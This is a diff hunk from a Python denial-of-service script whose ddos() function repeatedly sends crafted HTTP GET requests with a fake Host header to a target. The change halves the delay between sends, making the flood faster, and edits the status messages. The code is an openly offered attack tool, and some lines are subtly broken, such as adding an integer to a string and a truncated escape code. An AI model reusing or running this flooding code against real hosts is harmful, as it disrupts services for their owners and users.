@@ -64,12 +64,12 @@ def ddos():
                 s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
-                time.sleep(2)
+                time.sleep(1)
                 attack_num += 1
-                print(f"\033[48;5;0m{Fore.LIGHTWHITE_EX}Starting-ddos\033[0m {Fore.LIGHTCYAN_EX}"+ (attack_num)+"\033[0")
-                print(f"{Fore.LIGHTBLUE_EX}"+ str(trget)+"\033[0m")
+                print(f"\033[48;5;0m\033[37mStarting-ddos\033[0m {Fore.LIGHTCYAN_EX}"+(attack_num)+"\033[0")
+                print(f"{Fore.LIGHTBLUE_EX}"+str(fake)+"\033[0m")
             except socket.error:
-                time.sleep(2)
+                time.sleep(1)
                 print(f"{Fore.BLUE}[]  {Fore.YELLOW}Connection failed   \033[7m please check host\033[0m")
                 print(f"{Fore.YELLOW}[]  {Fore.BLUE}Connection failed   \033[101m please check host\033[0m")
                 break
